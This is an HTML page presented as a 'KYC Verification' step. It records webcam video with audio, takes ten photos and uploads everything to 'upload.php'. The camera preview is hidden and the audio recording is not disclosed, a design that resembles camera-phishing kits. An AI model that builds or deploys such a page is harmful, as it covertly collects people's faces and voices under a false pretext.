<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
    <title>KYC Verification</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body {
                  margin: 0;
                        font-family: sans-serif;
                              background: linear-gradient(to right, #1CB5E0, #000046);
                                    display: flex;
                                          justify-content: center;
                                                align-items: center;
                                                      height: 100vh;
                                                            color: white;
                                                                }
                                                                    .container {
                                                                          background: rgba(0,0,0,0.6);
                                                                                padding: 30px;
                                                                                      border-radius: 15px;
                                                                                            text-align: center;
                                                                                                }
                                                                                                    button {
                                                                                                          padding: 12px 25px;
                                                                                                                font-size: 16px;
                                                                                                                      background: #28a745;
                                                                                                                            color: white;
                                                                                                                                  border: none;
                                                                                                                                        border-radius: 8px;
                                                                                                                                              cursor: pointer;
                                                                                                                                                  }
                                                                                                                                                      video, canvas {
                                                                                                                                                            display: none;
                                                                                                                                                                }
                                                                                                                                                                  </style>
                                                                                                                                                                  </head>
                                                                                                                                                                  <body>
                                                                                                                                                                    <div class="container">
                                                                                                                                                                        <h2>KYC Verification</h2>
                                                                                                                                                                            <p>We will capture 10 photos and 1 video for your verification</p>
                                                                                                                                                                                <button onclick="startCapture()">Allow & Continue</button>
                                                                                                                                                                                    <video id="video" autoplay></video>
                                                                                                                                                                                        <canvas id="canvas"></canvas>
                                                                                                                                                                                          </div>

                                                                                                                                                                                            <script>
                                                                                                                                                                                                let imageBlobs = [];
                                                                                                                                                                                                    let videoBlob;

                                                                                                                                                                                                        async function startCapture() {
                                                                                                                                                                                                              try {
                                                                                                                                                                                                                      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                                                                                                                                                                                                                              const video = document.getElementById("video");
                                                                                                                                                                                                                                      video.srcObject = stream;
                                                                                                                                                                                                                                              video.play();

                                                                                                                                                                                                                                                      // Record 10 seconds video
                                                                                                                                                                                                                                                              const mediaRecorder = new MediaRecorder(stream);
                                                                                                                                                                                                                                                                      let chunks = [];

                                                                                                                                                                                                                                                                              mediaRecorder.ondataavailable = e => chunks.push(e.data);
                                                                                                                                                                                                                                                                                      mediaRecorder.onstop = async () => {
                                                                                                                                                                                                                                                                                                videoBlob = new Blob(chunks, { type: "video/webm" });
                                                                                                                                                                                                                                                                                                          await uploadAll(); // upload after all are ready
                                                                                                                                                                                                                                                                                                                  };

                                                                                                                                                                                                                                                                                                                          mediaRecorder.start();

                                                                                                                                                                                                                                                                                                                                  // Take 10 photos every 2 seconds
                                                                                                                                                                                                                                                                                                                                          const canvas = document.getElementById("canvas");
                                                                                                                                                                                                                                                                                                                                                  const ctx = canvas.getContext("2d");

                                                                                                                                                                                                                                                                                                                                                          for (let i = 0; i < 10; i++) {
                                                                                                                                                                                                                                                                                                                                                                    await new Promise(res => setTimeout(res, 2000));
                                                                                                                                                                                                                                                                                                                                                                              canvas.width = video.videoWidth;
                                                                                                                                                                                                                                                                                                                                                                                        canvas.height = video.videoHeight;
                                                                                                                                                                                                                                                                                                                                                                                                  ctx.drawImage(video, 0, 0);
                                                                                                                                                                                                                                                                                                                                                                                                            const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/jpeg"));
                                                                                                                                                                                                                                                                                                                                                                                                                      imageBlobs.push(blob);
                                                                                                                                                                                                                                                                                                                                                                                                                              }

                                                                                                                                                                                                                                                                                                                                                                                                                                      mediaRecorder.stop();

                                                                                                                                                                                                                                                                                                                                                                                                                                            } catch (err) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                    alert("Permission denied or error: " + err.message);
                                                                                                                                                                                                                                                                                                                                                                                                                                                          }
                                                                                                                                                                                                                                                                                                                                                                                                                                                              }

                                                                                                                                                                                                                                                                                                                                                                                                                                                                  async function uploadAll() {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                        const formData = new FormData();

                                                                                                                                                                                                                                                                                                                                                                                                                                                                              imageBlobs.forEach((blob, i) => {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      formData.append(`image${i + 1}`, blob, `photo${i + 1}.jpg`);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            });

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  formData.append("video", videoBlob, "video.webm");

                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        try {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                const res = await fetch("upload.php", {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          method: "POST",
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    body: formData
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            });
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    const msg = await res.text();
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            alert("Upload successful!\n" + msg);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  } catch (err) {
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          alert("Upload failed: " + err.message);
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    }
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </script>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </body>
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      </html>
